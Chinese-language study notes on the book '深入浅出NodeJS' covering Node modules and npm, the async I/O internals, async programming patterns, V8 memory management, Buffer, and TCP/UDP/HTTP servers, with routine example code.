# 深入浅出NodeJS

## Node简介

1. 基于chromeV8的javaScript运行环境
2. 使用事件驱动、非阻塞IO模型，使其轻量又高效

***特点***
1. 异步IO
   **在node中绝大多数的操作都是以异步的方式进行调用**
   异步IO比同步IO耗时短
2. 事件（req,res）与回调函数
3. 单线程
4. 跨平台
5. 应用场景----I/O密集型（并行IO--事件循环的处理能力）， CPU密集型

## 模块

### CommonJS --希望Javascript能够运行在任何地方
Node借用CommonJs的Modules规范实现了模块系统

**CommonJS----模块引入、模块定义、模块标识**

1. 模块引入: require
2. 模块定义: exports导出变量和方法，exports为module对象下的一个属性，每一个文件即为一个模块
3. 模块标识: 传入给require的参数
  
``` js
// exports为一个对象，将方法和属性挂载到对象上
exports.name = 'kk';
exports.foo = function () {};
// module.exports
function foo () {}
module.exports = {
  foo,
  name: 'kkk',
}

// require
const { foo, name } = require('./index.js');

```

### Node模块（核心模块和文件模块）的实现
引入模块需要经过3个步骤
1. 路径分析
2. 文件定位
3. 编译执行

**核心模块：**在node源码的编译过程中，编译进了二进制执行文件，Node启动时，部分核心模块就被直接加载进内存中，这部分的模块在引入时不进行文件定位和编译执行，路径分析也会优先判断，所以他的速度是最快的

**文件模块：**动态加载执行3个步骤，加载慢

**自定义模块或包：**加载最慢

### 优先从缓存加载（引入过的模块会被缓存--Node缓存的是编译和执行后的对象--浏览器缓存的是文件）--缓存在Module._cache上

### 模块编译

**CommonJS模块的编译：**每个模块中都有exports, require, module, __filename, __dirname，他们是从何而来，实际上在编译时，node将js文件包装成了如下方式，避免了变量污染全局
``` js
(function (exports, require, module, __filename, __dirname) { 
  var math = require('math'); 
  exports.area = function (radius) { 
    return Math.PI * radius * radius; 
  }; 
}); 
```
    json文件的编译，fs模块引入后调用JSON.parse()
      文件模块
       |
       |依赖
       |
      javaScript核心模块----采用V8附带的js2c.py工具转存为C/C++里的数组中以字符串的方式存在，不能直接运行，Node启动后，通过标识分析加载到内存，比普通的文件模块从磁盘读取快
      职责：1. 作为C/C++内建模块的封装层或桥接层，供文件模块调用
           2. 纯碎的功能模块，不和底层打交道，但又很重要
       |
       |依赖
       |
      内建模块----由C/C++编写，性能高于脚本语言，编译成二进制文件，Node运行时直接存在内存中，直接可以执行，引入时最快

**文件模块不要直接调用内建模块，调用js模块（封装了内建模块）**

### 包与NPM

**包结构**
``` js

|--package.json // 包描述文件
|--bin //存放可执行的二进制文件
|--lib //存放javascript代码目录
|--doc //存放文档
|--test //存放单元测试用例的代码

```

**package.json文件**
1. dependencies(当前包所需要依赖的包的列表)
2. scripts(脚本说明对象，主要被包管理器用来安装、编译、测试和卸载包)
3. bin（把一些包当作命令行工具使用）"express": "./bin/express"
4. devDependencies(开发依赖的包列表)

### NPM

***CommonJS包规范是一种理论，NPM（第三方模块包的发布、安装和依赖等）则是其中的一种实践***

**1. 借助NPM，Node与第三方模块形成了一个生态系统**
**2. 借助NPM可以帮助用户快速安装和管理包**

全局模式并不是将一个包安装为全局（在什么地方都可以require），-g是将包安装成一个全局可用的可执行命令，通过package.json中的bin字段控制,将实际脚本链接到与Node可执行文件相同的路径下
`path.resolve(process.execPath, '..', '..', 'lib', 'node_modules')`
如果Node可执行文件路径是/usr/local/bin/node，那么模块路径就是/usr/local/lib/node_ 
modules。最后，通过软连接的方式将bin字段配置的可执行文件配置到node的可执行目录下

**安装：**
1. 本地安装只需为NPM指定package.json 文件所在的位置
   `npm install <fiel/url/folder(包含package.json)>`
2. 非官方远安装，设置镜像
   `npm config set registry http://registry.url`

#### 发布包

1. `npm init`
2. 编写index.js
3. 注册包仓库账号 `npm adduser`
4. 上传包 `npm publish <folder>` 在package.json文件所在目录

**管理包的维护者：**

1. 包的所有维护者
   `npm owner ls <package name> `
2. 添加包的维护者
   `npm owner add <package name> `
3. 删除包的维护者
   `npm owner rm <package name> `

分析包 `npm ls`分析当前目录下能ܴ够通过模块路径找到的所有包，并生成依赖树

企业局域NPM：共享复用模块   

### 前后端共用模块

后端模块规范：CommonJS
前端端模块规范：ES6Module/AMD/CMD

AMD ---- 定义时通过形参的方式传入依赖的模块。明确定义了一个模块，避免全局污染
``` js
// 模块id和依赖是可选的
define(id?, dependencies?, factory);
define([moduleA, moduleB] function(mA, mB) {
  return function () {
    ...
  }
});

// demo
define(function () {
  let exports = {};
  exports.sayHello = function () {
    return 'Hello'
  }
  return exports;
})
```

CMD 
``` js
define (function (exports, module, require ) {
  ...
})
```



## 异步I/O(输入/输出)

### 为什么使用异步I/O
1. 用户体验(异步I/O耗时短)I/O（分布式）是昂贵的，只有后端快速响应资源，前端体验才更好
2. 资源分配
   **Node: 利用单线程远离多线程死锁、状态同步问题，利用异步I/O，让单线程远离阻塞，以更好的利用CPU，资源分配更高效**
   **单线程无法利用多核CPU：使用Web Workers的子进程，通过工作进程高效利用CPU和I/O**

***期望：I/O的调用不再阻塞后续运算，将原有等待IO完成的这段时间分配给其于需要的业务去执行***

### 异步I/O实现现状 

#### 异步I/O与阻塞I/O

在操作系统内核对于I/O只有两种方式：
1. 阻塞I/O： 调用之后一定要等到系统内核层面完成所有的操作后，调用才结束----CPU资源浪费
2. 非阻塞I/O： 调用之后立即返回（但状态没变，需要再次调用判断是否完成----轮询（epoll））

#### 现实中的异步I/O ---- 用线程池模拟的异步I/O

通过让部分线程进行阻塞I/O或者非阻塞I/O加轮询技术来完成数据的获取，让一个线程进行计算处理，通过线程之间通信将I/O得到的数据进行传递，这就轻松实现了异步I/O（尽管他是模拟的），

linux: 自定义线程池
window: IOCP

***Node是单线程仅仅只是javaScript执行在单线程，Node中无论是linux/window内部执行I/O任务都是有其他线程池的***

### Node异步I/O

完成整个异步I/O环节：
1. 事件循环
2. 观察者
3. 请求对象

#### 事件循环（生产者/消费者模型，异步I/O，网络请求则是事件的生产者） ---- 使得回调函数十分普遍

在进程启动时创建了一个类似while(true) {}的循环，每执行一次循环体的过程称为Tick，每个Tick的过程就是查看是否有事件待处理，如果有，就取出事件及相关回调函数，如果存在关联的回调函数，就执行他们，然后进入下一个循环，如果不再有事件处理，就退出进程。
``` js

while (true) {
  ... // 每执行一次循环体的过程称为Tick
}

```

                  开  始
                    |
        |———————是否还有事件（向观察者询问）————否————退出
        |           |
        |           |是
        |       取出一个事件
        |           |
        |           |
        |————否——是否有相关回调
        |           |
        |           |是
        |        执行回调
        |           |
        |           |
        ————————————|

#### 观察者 ---- 判断是否有事件需要处理

每个事件循环中有一个或多个观察者（每个观察者有一个或多个事件），而判断是否有事件要处理的过程就是向这些观察者询问是否有要处理的事件

***事件循环是生产者/消费者模型----异步I/O、网络请求则是事件的生产者，源源不断的为Node提供不同类型的事件，这些事件被传递到对应的观察者那里，事件循环则从观察者那里取出事件并处理***

#### 请求对象

**探寻从javaScript代码到系统内核之间发生了什么？**

1. 对于一般的非异步回调函数，函数由我们调用

``` js
const myEach = function (arr, callback) {
  for (let i = 0; i < arr.length; i++) {
    callback(arr[i], i, arr)
  }
}

myEach(arr, (item, index) => {
  ...
})

```
2. 对于Node中的异步I/O调用而言，回调函数不由开发者调用，事实上，从javaScript发起调用到内核执行完成I/O操作的过渡过程中，存在一种中间产物，叫请求对象

``` js

app.get('/', (req, res) => {
  ...
})

```

***探索Node与底层之间是如何执行异步I/O调用以及回调函数究竟是如何被调用执行的***

从javaScript调用Node核心模块，核心模块调用C/C++内建模块，内建模块通过libuv进行系统调用，这是Node里经典的调用方式。

                           开  始
                             |
                             ↓
                         fs.open() -> lib/fs.js(Node核心模块)
                             |
                             ↓
                           Open() -> src/node_file.cc(内建模块)
                             |
                             ↓
                    ------平台判断------
                    |                 |
                    ↓                 ↓
          deps/uv/src/unix/       deps/uv/src/win/   |---libuv
          fs.cuv_fs_open()        fs.cuv_fs_open()   |---libuv
               |    |                 |
               |    ——————————————————-
               |             ↓
               |            结束
               |
               ↓
1. open调用过程中，创建了FSReqWrap请求对象，从javaScript层传入的参数都被封装在这个对象中，回调函数被设置在这个对象的oncomplete_sym属性上，对象包装完毕后，在window下调用QueueUserWorkItem()方法将这个FSWrap对象推入线程池中等待执行。
QueueUserWorkItem(&uv_fs_thread_proc(将要执行方法的引用), req(uv_fs_thread_proc方法执行所需的参数), WT_EXRCUTEDEFAULY(执行的标志))
2. 当线程池中有可用的线程时，执行uv_fs_thread_proc方法，方法根据传入的参数的类型调用相应的底层函数，uv_fs_open -------> fs__open()


**至此，JavaScript调用立即返回，由JavaScript层面发起的异步调用的第一阶段就此结束。
JavaScript线程可以继续执行当前任务的后续操作。当前的I/O操作在线程池中等待执行，不管它
是否阻塞I/O，都不会影响到JavaScript线程的后续执行，就此达到异步的目的。**

请求对象是异步I/O过程中的重要中间产物，所有的状态都保存在这个对象中，包括送入线程池等待执行以及I/O操作完毕的回调函数

#### 执行回调

异步I/O的第二部分，回调通知

线程池中的I/O操作调用完毕之后，会将获取的结果存储在req->result属性性上，然后调用
PostQueuedCompletionStatus()通知IOCP，告知当前对象的操作已经完成。
PostQueuedCompletionStatus((loop)->iocp, 0, 0, &((req)->overlapped)) ----> 提交执行状态，并将线程归还线程池。

在这个过程中，我们其实还动用了事件循环的I/O观察者。在每次Tick的执行中，它会调用
IOCP相关的GetQueuedCompletionStatus()方法检查线程池中是否有执行完的请求，如果存在，会
将请求对象加入到I/O观察者的队列中，然后将其当作事件处理。
I/O观察者回调函数的行为就是取出请求对象的result属性作为参数，取出oncomplete_sym属
性作为方法，然后调用执行，以此达到用JavaScript中传入的回调函数的目的。
至此，整个异步I/O的流程完全结束。

***Node异步IO模型基本要素：单线程、事件循环、观察者、请求对象、I/O线程池***

### 非I/O的异步API ---- setTimeout/setInterval/setInmediate/process.nextTick()

1. 定时器需要动用红黑树（时间复杂度：O(log n)），创建定时器对象和迭代等操作----浪费性能
2. process.nextTick只会将回调函数放入队列中，在下一轮tick时取出执行，时间复杂度O(1)

setInmediate/process.nextTick ---- 延时执行----process.nextTick较快

### 事件驱动与高性能服务器

事件驱动的实质：通过主循环加事件触发的方式运行程序

每线程每请求（多线程服务器）：每个线程都会占用一定的内存，当大并发请求到来时，内存会很快用完，导致服务器缓慢。

Node服务器：通过事件驱动的方式处理请求，无须为每一个请求创建额外的对应线程，可以省掉创建线程和销毁线程开销，同时操作系统在调度任务时因为线程较少，上下文切换的代价很低，使得服务器有条不紊的处理请求，即使在大量连接的情况下，也不受线程上下文切换开销的影响，这是Node高性能的一个原因。



## 函数式编程----函数是第一等公民（可以作为参数，作为返回值返回，函数调用）

### 高阶函数----将函数作为参数或函数作为返回值的函数

``` js

function bar (callback) {
  callback();
}

function foo(x) {
  return function () {
    return x;
  }
}

```
事件的处理方式正是基于高阶函数的特性来完成的，通过注册不同的回调函数，可以很灵活的处理业务逻辑。

``` js
let emitter = new events.EventEmitter();
emitter.on('event_foo', function () {
  ...
})
```

### 偏函数----通过指定部分参数，来产生一个新的定制函数的形式就是偏函数

``` js

// ES5 判断type类型

const toString = Object.prototype.toString;

function isString (obj) {
  return toString.call(obj) === '[object String]'
}

function isFunction (obj) {
  return toString.call(obj) === '[object Function]'
}

// 偏函数

function isType (type) {
  // 产生的新的定制函数
  return function (obj) {
    return toString.call(obj) === `[object ${type}]`
  }
}

const isString = isType('String');
const isFunction = isType('Function');
```

### 异步编程的优势与难点

**优势：**Node带来的最大特性--基于事件驱动的非阻塞I/O模型
**难点**
1. 异常处理--try-catch不能捕获到回调函数中的异常
Node在处理异常上形成了一种约定，将异常作为回调函数的第一个参数返回，如果为空就无异常
**编写异步方法的原则**
  1. 必须执行调用者传入的回调函数
  2. 正确传递异常供调用者判断
``` js
var async = function (callback) { 
  process.nextTick(function() { 
   var results = something; 
   if (error) { 
    return callback(error); 
   } 
   callback(null, results); 
  }); 
};

// 容易犯的错 ---- 对用户传递的回调函数异常捕获
// 错误代码
try { 
  req.body = JSON.parse(buf, options.reviver); 
  callback(); 
} catch (err){ 
  err.body = buf; 
  err.status = 400; 
  callback(err); 
}

// 正确代码
try { 
  req.body = JSON.parse(buf, options.reviver); 
} catch (err){ 
  err.body = buf; 
  err.status = 400; 
  return callback(err); 
}

callback();

```

2. 嵌套过深
3. 阻塞代码----使用setTimeout
4. 多线程编程----Web Workers
   javaScript----单一线程上执行的代码，在浏览器中指javaScript执行线程与UI渲染共用一个线程


### 异步编程解决方案

1. 事件发布/订阅模式
   ``` js
    // 订阅
    emitter.on('trigger', function (msg) {
     ...
    })
    // 发布
    // emit通常是伴随事件循环而异步触发的，因此事件发布/订阅广泛应用于异步编程
    emitter.emit('trigger', 'I am msg')
   ```
  **(1)继承events模块----利用事件机制解决业务问题**
  ``` js
  let events = require('events');
  function Stream () {
    events.EventEmitter.call(this);
  }
  util.inherits(Stream, events.EventEmitter);
  ```

  **(2)利用事件队列解决雪崩问题----高访问量，大并发情况下缓存失效，此时大量的请求同时涌入数据库，数据库无法同时承受如此大的查询请求，影响网站整体的响应速度**
  ``` js
  // 基本数据库查询
  let select = function (callback) {
    db.select("SQL", function (results) {
      callback(results);
    })
  }

  // 加状态锁改进
  let status = 'ready';
  let select = function (callback) {
    if (status === 'ready') {
      status = 'pending';
      db.select("SQL", function (results) {
        status = 'ready'
        callback(results);
      })
    }  
  }

  // 使用事件队列
  const proxy = new events.EventEmitter();
  let status = 'ready';
  let select = function (callback) {
    proxy.once("selected", callback);
    if (status === 'ready') {
      status = 'pending';
      db.select("SQL", function (results) {
        proxy.emit("selected", results)
        status = 'ready'
      })
    }  
  }
  ```

  **(3)多异步之间的协作**
  EventProxy

2. Promise(可变部分then(fullfilledHandle, errorHandle))/Deferred(延迟对象--将业务中不可变的部分封装在Deferred中--resolve/reject)模式
   Promise/A、Promise/B、Promise/D

   **Promise/A**
   Promise实现的原理-----怎样实现promise和链式调用

   **promise化API**


3. 流程控制库

**尾触发(手工调用才能持续后续的调用----next)与Next**
``` js
// 中间件----处理网络请求时，可以像面向切面编程一样进行过滤、验证、日志等功能，不与具体业务逻辑产生关联，以致产生耦合
function (req, res, next) {
  ...
}
```
connect实现原理

**控制模块--async**

***async.series()实现一组任务的串行执行***
```js
async.series([
  // 此处的回调函数通过高阶函数的方式注入，每个callback执行都会将结果保存，然后执行下一个回调，直到执行完所有，最终的回调函数执行时，队列里的异步调用保存的结果以数组的方式传入，这里的异常处理规则是一旦出现异常，就结束所有的调用，并将异常传递给最终回调函数的第一个参数
  function (callback) {
    fs.readFile('file1.txt', 'utf-8', callback)
  },
  function (callback) {
    fs.readFile('file2.txt', 'utf-8', callback)
  }
], function (err, result) {
  console.log (result) // [ file1.txt, file2.txt ]
})

// 上面的代码等价于
fs.readFile('file1.txt', 'utf-8', function (err, content) { 
  if (err) { 
   return callback(err); 
  } 
  fs.readFile('file2.txt ', 'utf-8', function (err, data) { 
    if (err) { 
      return callback(err); 
    } 
    callback(null, [content, data]); 
  }); 
});
```

***async.parallel()实现一组并行执行***
```js
async.parallel([
  function (callback) {
    fs.readFile('file1.txt', 'utf-8', callback)
  },
  function (callback) {
    fs.readFile('file2.txt', 'utf-8', callback)
  }
], function (err, result) {
  console.log (result) // [ file1.txt, file2.txt ]
})

// 上面的代码等价于
var counter = 2; 
var results = []; 
var done = function (index, value) { 
  results[index] = value; 
  counter--; 
  if (counter === 0) { 
    callback(null, results); 
  } 
}; 
// 只传递第一个异常
var hasErr = false; 
var fail = function (err) { 
  if (!hasErr) { 
    hasErr = true; 
    callback(err); 
  } 
}; 
fs.readFile('file1.txt', 'utf-8', function (err, content) { 
  if (err) { 
    return fail(err); 
  } 
  done(0, content); 
}); 
fs.readFile('file2.txt', 'utf-8', function (err, data) { 
  if (err) { 
    return fail(err); 
  } 
  done(1, data); 
});
```

***异步调用的依赖处理***
series()适合无依赖的异步串行执行，但当前一个的结果是后一个调用的输入时，使用async.waterfall()方法来满足

``` js
async.waterfall([
  function (callback) {
    fs.readFile('file1.txt', 'utf-8', function(err, content) {
      callback(err, content);
    })
  },
  function (arg1, callback) {
    // arg1 ---- file2.txt
    fs.readFile(arg1, 'utf-8', function(err, content) {
      callback(err, content);
    })
  },
], function (err, result) {
  console.log (result) // file4.txt
})

// 上面的代码等价于
fs.readFile('file1.txt', 'utf-8', function (err, data1) { 
  if (err) { 
    return callback(err); 
  } 
  fs.readFile(data1, 'utf-8', function (err, data2) { 
    if (err) { 
      return callback(err); 
    } 
    fs.readFile(data2, 'utf-8', function (err, data3) { 
      if (err) { 
        return callback(err); 
      } 
      callback(null, data3); 
    }); 
  }); 
});
```

***自动依赖处理***
async.auto();对复杂的依赖关系以最佳的顺序执行

``` js
var deps = { 
  readConfig: function (callback) { 
  // read config file 
    callback(); 
  }, 
  connectMongoDB: ['readConfig', function (callback) { 
  // connect to mongodb 
    callback(); 
  }], 
  connectRedis: ['readConfig', function (callback) { 
  // connect to redis 
    callback(); 
  }], 
  complieAsserts: function (callback) { 
  // complie asserts 
    callback(); 
  }, 
  uploadAsserts: ['complieAsserts', function (callback) { 
  // upload to assert 
    callback(); 
  }], 
  startup: ['connectMongoDB', 'connectRedis', 'uploadAsserts',      function (callback) { 
  // startup 
  }] 
}; 
async.auto(deps);
```

**Step----比async轻量----只有一个接口Step()**
`npm install step`

***串行执行***
``` js
Step(task1, task2, task3)
Step(
  function readFile1() { 
    // this---内部是一个next()----将异步调用的结果给下一个任务作为参数,并调用执行
    fs.readFile('file1.txt', 'utf-8', this); 
  }, 
  function readFile2(err, content) { 
    fs.readFile('file2.txt', 'utf-8', this); 
  }, 
  function done(err, content) { 
    console.log(content); 
  } 
); 

```

***并行执行***
``` js
Step(task1, task2, task3)
Step(
  function readFile1() { 
    // this.parallel()---等所有任务完成时才进行下一个任务 ---- 如果异步方法的结果传回的是多个参数，Step只会获取前两个
    fs.readFile('file1.txt', 'utf-8', this.parallel()); 
    fs.readFile('file2.txt', 'utf-8', this.parallel());
  }, 
  function done(err, content1, content2) { 
    console.log(content1, content2); //file1 file2
  } 
); 

```

***结果分组***
``` js
Step( 
  function readDir() { 
    fs.readdir(__dirname, this); 
  }, 
  function readFiles(err, results) { 
    if (err) throw err; 
    // Create a new group 
    var group = this.group(); 
    results.forEach(function (filename) { 
      if (/\.js$/.test(filename)) { 
        fs.readFile(__dirname + "/" + filename, 'utf8', group()); 
      } 
    }); 
  }, 
  function showAll(err, files) { 
    if (err) throw err; 
    console.dir(files); 
  } 
);
```

**Wind**

4. 异步并发控制
   
**bagpipe更灵活**
**async.parallelLimit()/async.queue()动态添加异步任务**



## 内存管理

对于性能敏感的服务端程序，内存管理的好坏、垃圾回收状况是否优良，都会对服务造成影响。

### V8的垃圾回收机制和内存限制

在node中通过javaScript使用内存只能使用部分内存（64位-1.4GB/32位-0.7GB）---导致Node无法直接操作大内存对象----V8自己的方式分配管理限制了内存用量

#### V8的对象分配----所有的javaScript对象都是通过堆来进行分配的
内存使用量的查看方式
进程内存：rss(常驻内存)、swap(交换区)、filesystem(文件系统)
``` js
$ node
> process.memoryUsage();
{
  // 单位-字节
  rss: 14958592, // 进程的常驻内存
  heapTotal: 8666666, // 已申请到的堆内存
  heapUsed: 233432 //当前使用量
}
```
变量声明并赋值----所使用对象的内存就分配在堆中，超过最大限制就会崩溃
可以在V8初始化时设置最大分配内存
***V8的限制深层原因是垃圾回收机制的限制***

#### V8的垃圾回收机制----基于分代式垃圾回收机制

**分代式垃圾回收机制：**按对象的存活时间将内存的垃圾回收进行不同的分代，然后分别对不同分代的内存施加更高效的算法

***V8的内存分代：***
1. 新生代--存活时间较短--Scavenge算法（Cheney算法-复制方式实现）
2. 老生代--存活时间较长或长期存在内存--Mark-Sweep（标记清除） & Mark-Compact（标记整理）算法
Incremental Marking----增量标记


#### 查看垃圾回收日志
`node --prof test.js`

### 高效使用内存

#### 作用域

**内存回收过程：**函数定义时生成作用域，执行函数后，作用域释放，局部变量失效，其引用的对象会在下次垃圾回收时被释放

1. 标识符查找：变量先在当前作用域查找，找不到后向上级作用域查找，直到找到
2. 作用域链：标识符查找形成的链条
3. 变量的主动释放：删除对象的引用关系（可能会干扰V8的优化）/重新赋值（更好）


#### 闭包--外部作用域访问内部作用域中变量的方法（得益于高阶函数）

``` js
const foo = function () {
  const bar = function () {
    const local = 'part-in';
    return () => {
      return local;
    }
  }
  const baz = bar();
  console.log (baz());
  // baz函数执行完成后，局部变量local将会随着作用域的销毁而被回收
}
```

闭包的问题：一旦有变量引用了中间函数，这个中间函数将不会释放，同时也会使原始的作用域不会得到释放，作用域中产生的内存占用也不会得到释放，除非不再引用，才会逐步释放，--导致内存溢出--导致进程退出

***无法立即回收的内存：***全局变量、闭包，此类变量无限增加导致老生代中的对象增多。

### 内存指标

变量会自动回收和释放，也存在我们认为回收但是没有回收的对象，这会导致内存无限增长，一旦达到V8的限制--导致内存溢出--导致进程退出

#### 查看内存的使用情况

1. 查看进程的内存占用----`process.memoryUsage()`
2. 查看系统的内存占用----os模块的`os.totalmem()`总内存，`os.freemem()`闲置内存

#### 堆外内存----不通过V8分配

突破内存限制--Buffer对象
javaScript中直接处理字符串即可满足大多业务需求，Node中处理网络流和文件I/O流，操作字符串不能满足性能要求。

### 内存泄漏

造成内存泄漏的原因
1. 缓存
2. 队列消费不及时
3. 作用域未释放


**在Node中拿内存当缓存的策略要谨慎使用**

1. 缓存限制策略
   解决缓存中的对象永远无法释放的问题--对键值对数量的限制（limitablemap模块、LRU算法）
   模块的缓存机制--使用队列清空缓存
2. 缓存的解决方案
   将缓存转移到外部，减少常驻内存的对象的数量，让垃圾回收更高效
   进程之间可以共享缓存
   Redis/Memcached

**关注队列（数组对象）状态**
消费者-生产者模型中-队列充当中间产物，消费速度低于生产速度形成堆积（用数据库记录日志），javaScript中的作用域不会得到释放，内存占用不会回落，从而出现内存泄漏。

**解决方法：**
1. 监听队列的长度，一旦堆积，通过系统报警通知相关人员
2. 任意异步调用都包含超时机制，通过回调函数传递超时异常使异步调用具有可控的响应时间，给消费速度一个下限值
   
Bagpipe: 超时模式、拒绝模式（当队列拥塞时，新到来的调用直接响应拥塞错误）

### 内存泄漏排查： 堆快照

1. node-heapdump
   ``` js 
   // 首次安装告警
   npm install --global --production windows-build-tools
   npm install --global node-gyp
   npm install heapdump
   var heapdump = require('heapdump');

   // 向服务器进程发送SIGUSR2信号让node-heapdump抓拍一份内存快照--JSON文件，通过Chrome的开发者工具中选中Profiles面板
   kill -USR2 <pid>
   ```
2. node-memwatch
3. v8-profiler
  v8-profiler 提供了 transform 流的形式输出堆快照，对于一些比较大的堆快照文件能更好的进行生成处理：
   ``` js

   npm install v8-profiler



   ```

### 大内存的应用

通过流Stream（继承EventEmitter）模块的方式操作大文件

``` js

var reader = fs.createReadStream('in.txt'); 
var writer = fs.createWriteStream('out.txt'); 
reader.on('data', function (chunk) { 
  writer.write(chunk); 
}); 
reader.on('end', function () {
  writer.end(); 
});

// 简写
var reader = fs.createReadStream('in.txt'); 
var writer = fs.createWriteStream('out.txt'); 
// pipe封装了data事件和写入操作
reader.pipe(writer);
```



## Buffer----处理网络协议、操作数据库、处理图片、接受上传文件、大量的二进制数据

### Buffer结构

Buffer是一个像Array的数组，但它主要用于操作字节。

#### 模块结构

Buffer = javaScript(非性能部分--核心模块--(Buffer/SlowBuffer)) + C++(性能部分--内建模块(node_buffer))
Buffer属于堆外内存，node启动时就加载，在global上无需require

#### Buffer对象----类似数组（元素为16进制的两位数（0-255））

中文字在UTF-8编码下占3个元素，字母和半角标点占1个元素
buffer赋值小数时会舍去小数部分

#### Buffer内存分配

C++层面申请内存，javaScript中分配内存
Node使用slab(动态内存管理)分配机制分配内存
slab----一块申请好的固定大小的内存区域
slab三种状态
1. full: 完全分配
2. partial: 部分分配
3. empty: 没有分配
   
**指定Buffer对象的大小, 以8KB区分大对象和小对象**
`new Buffer(size)` 
`buffer.poolSize = 8 * 1024`  

小buffer->采用slab机制先申请和事后分配
大buffer->使用C++层面提供的内存


### Buffer的转换

#### 字符串转Buffer--通过构造函数（存储的一种编码类型）完成
``` js
// encoding默认utf-8
new Buffer(str, [encoding])

// 一个buffer对象可以存储不同编码类型的字符串转码值
buf.write(string, [offser], [length], [encoding])
```

#### Buffer转字符串--Buffer.toString()

``` js
// start/end 整体或局部转换，有多种编码，在局部指定类型
buf.toString([encoding], [start], [end])

```

#### Buffer不支持的编码类型--GBK/GB2312等

1. 判断是否支持
`Buffer.isEncoding(encoding)`
2. 不支持的用Node中的模块iconv/iconv-lite(更轻量)


### Buffer拼接

``` js
var fs = require('fs'); 
var rs = fs.createReadStream('test.md'); 
var data = ''; 
rs.on("data", function (chunk){ 
  //隐式转换toString,中文时出问题
  data += chunk; 
}); 
rs.on("end", function () { 
  console.log(data); 
});

// 正确的拼接形式
var chunks = []; 
var size = 0; 
res.on('data', function (chunk) { 
  chunks.push(chunk); 
  size += chunk.length; 
}); 
res.on('end', function () {
  var buf = Buffer.concat(chunks, size); 
  var str = iconv.decode(buf, 'utf8'); 
  console.log(str); 
});
```

### Buffer与性能--网络传输中性能举足轻重

网络请求时将字符串转为buffer传输，传输率性能提升。
**通过预先将静态内容转为buffer对象，可以有效的减少CPU的重复使用，节省服务器资源。**
Web应用中可以将动态内容与静态内容分离，静态内容预先转为buffer,提升性能

**文件的读写尽量只读buffer**
``` js
// 创建文件读写流时，参数highWaterMark值越大，读取速度越快
fs.createReadStream(path, opts)
{ 
 flags: 'r', 
 encoding: null, 
 fd: null, 
 mode: 0666, 
 highWaterMark: 64 * 1024 
},
{start: 90, end: 99}
```



## 网络编程

TCP: net模块
UDP: dgram模块
HTTP: http模块
HTTPS: https模块


### 构建TCP（传输控制协议）服务

OSI模型--七层协议

  应用层--HTTP/SMTP/IMAP等
  表示层--加密/解密
  会话层--通信连接/维持会话
  传输层--TCP/UDP
  网络层--IP
  链路层--网络持有的链路接口
  物理层--网络物理硬件

**TCP:** 
面向连接，传输之前需要3次握手形成会话，会话形成后客户端和服务器才能进行通信
创建会话的过程中，服务端和客户端分别提供一个套接字(可读，可写的Stream对象)，这两个套接字共同形成一个连接。通过套接字实现两者之间连接的操作。

通过net模块建立tcp服务
``` js
const net = require('net');

// TCP服务
// createServer: 是一个EventEmitter实例
// connection: 每个客户端套接字连接到服务器时触发，createServer的最后一个参数
const server = net.createServer((socket) => {
  // 新的连接
  socket.on('data', (data) => {
    socket.write("Hello!")
  });
  socket.on('end', () => {
    console.log ('连接断开')
  })
  socket.write('Welcome to Nodejs');
})

server.on('close', () => {
  console.log ('I am close')
})
server.on('error', () => {
  console.log ('I am error')
})
// socket是连接事件connection的侦听器
// 通过connection事件的方式进行侦听
server.on('connection', (socket) => {
  socket.write("Hello! Connection");
})
server.listen(8124, () => {
  console.log ('server bound');
})

// 客户端
const net = require('net');
// 每个连接是典型的可写可读Stream对象，通过data从一段读取另一端发来的数据，write从一端向另一端发送数据
// domain Socket(本地进程间通信)
// net.connect({ path: '/template/echo.sock' })
// connect: 套接字与服务端连接成功触发
const client = net.connect({ port: 8124 }, () => {
  console.log ('connect success');
  client.write('word client !');
  client.on('drain', () => {
    console.log ('任意一端调用write发送数据时，当前这端会触发该事件')
  })
})

client.on('data', (data) => {
  console.log(data.toString());
  client.end();
})

client.on('end', () => {
  console.log('connect end')
})


// TCP套接字是可读可写的Stream对象，可以利用pipe方法巧妙的实现管道操作
// echo服务器
const net = require('net');
const server = net.createServer((socket) => {
  socket.write('Echo server')
  socket.pipe(socket);
})
server.listen(1337, '127.0.0.1');
```
TCP对小数据包优化策略： Nagle算法--缓冲区的数据达到一定量或一定时间后发出，（小数据包不能及时发送）Node默认开启

去掉Nagle算法：`socket.setNoDelay(true)`
不是每触发一次write，data事件就会响应


### 构建UDP服务--数据包协议--DNS服务器基于UDP

**UDP:**一旦建立连接，所有的会话都基于连接完成。一个套接字可以与多个UDP服务通信，提供面向事务的简单不可靠信息传输

**创建UDP套接字**既可以作为客户端发送数据，也可作为服务器接收数据
``` js
const dgram = require('dgram');
const socket = dgram.createSocket('udp4')
```

UDP服务
``` js
// UDP服务
// 让udp套接字接收网络消息，dgram.bind(port, [address])网卡和端口进行绑定
const dgram = require('dgram');
const server = dgram.createSocket('udp4');
server.on('message', (msg, rinfo) => {
  console.log (`server got : ${msg} from ${rinfo.address}: ${rinfo.port}`)
} )
server.on('listening', () => {
  const address = server.address();
  console.log (`server listening ${address.address}: ${address.port}`)
})
// 该套接字接收所有网卡端口为41234的消息，绑定完触发listening事件
server.bind(41234)

// UDP Client
const dgram = require ('dgram');
const message = Buffer.from('Nodejs');
const client = dgram.createSocket('udp4');
/**
 * send(buf->Buffer, offset->Buffer的偏移, length->Buffer的长度, port->目标端口, address->目标地址, [callback])
*/
client.send(message, 0, message.length, 41234, 'localhost', (err, bytes) => {
  client.close();
})
```

### 构建HTTP服务--超文本传输协议，构建在TCP上

B/S模式： 浏览器 ---- HTTP ----服务器

**HTTP报文**

TCP三次握手 ---- 客户端向服务端发送请求报文 ----服务器端完成处理后向客户端发送响应报文

**http模块**
HTTP服务继承TCP服务，能够与多个客户端保持连接，采用事件驱动，不为每一个连接创建额外的线程或进程，保持很低的内存占用，所以能实现高并发。

套接字的读写抽象为ServerRequest、ServerResponse对象

无论服务器端在处理业务逻辑是否发生异常，务必结束时调用res.end()结束请求，否则客户端一直处于等待状态

***http服务***
``` js
const http = require('http');
http.createServer((req, res) => {
  // 响应体
  // 可以调用setHeader进行多次设置，只有调用writeHead后，报头才会写入连接中
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Hello World');
}).listen(1337, '127.0.0.1')
console.log ('server running at http://127.0.0.1:1337');
```
***http服务事件***
1. connection事件：在开始HTTP请求和响应前，客户端与服务器需要建立底层的TCP连接，这个连接可能因为开启了keep-alive,可以在多次请求响应之间使用，当这个连接建立时，服务器触发一次connection事件
2. request事件，服务器解析到请求头后触发
   
